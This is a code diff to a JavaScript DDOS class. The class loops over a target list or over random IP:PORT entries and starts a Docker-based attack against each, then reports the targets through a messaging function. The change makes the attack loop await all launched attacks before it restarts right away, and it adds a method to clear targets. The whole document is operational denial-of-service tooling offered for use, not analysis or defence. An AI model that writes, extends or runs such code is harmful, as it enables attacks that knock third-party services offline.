@@ -59,6 +59,8 @@ class DDOS {
     const _count = count;
     console.log(`DDOS ${_count} stared!`);
 
+    const actions = [];
+
     try {
       if (this.targets.length) {
         this.isTargets = true;
@@ -68,7 +70,7 @@ class DDOS {
           const target = this.targets.pop();
           this.sendMessage(`DDOS => ${target}`);
           console.log(`DDOS => ${target}`);
-          this.runDocker(target);
+          actions.push(this.runDocker(target));
         }
       } else {
         this.isTargets = false;
@@ -93,17 +95,20 @@ class DDOS {
           const { IP, PORT, DESCRIPTION } = randomRows[i];
           this.sendMessage(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
           console.log(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
-          this.runDocker(`${IP}:${PORT}`);
+          actions.push(this.runDocker(`${IP}:${PORT}`));
         }
       }
     } catch (err) {
       console.log("err", err);
     }
 
-    setTimeout(() => {
-      console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
-      this.ddos({ count: _count + 1 });
-    }, (ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
+    await Promise.all(actions);
+    console.log(`DDOS ${_count} done!`);
+    this.ddos({ count: _count + 1 });
+    // setTimeout(() => {
+    //   console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
+    //   this.ddos({ count: _count + 1 });
+    // }, (ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
 
     // await sleep((ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
     // // await sleep(SUCCESS_SLEEP_SECONDS * 1000);
@@ -116,6 +121,9 @@ class DDOS {
   addTargets(targets) {
     const newTargets = [...new Set([...this.targets, ...targets])];
     this.targets = newTargets;
+  }
+  clearTargets() {
+    this.targets = [];
   }
 
   async getRunnigContainers() {
